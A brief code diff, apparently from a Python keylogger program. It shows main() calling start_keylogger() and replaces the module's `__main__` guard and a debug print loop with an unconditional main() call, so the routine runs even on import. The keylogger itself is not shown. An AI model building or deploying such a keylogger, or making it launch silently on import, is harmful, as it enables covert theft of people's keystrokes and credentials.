@@ -125,8 +125,4 @@ def main():
     start_keylogger()
 
 
-if __name__ == "__main__":
-    main()
-    while True:
-        print("HEY")
-        time.sleep(1)
+main()
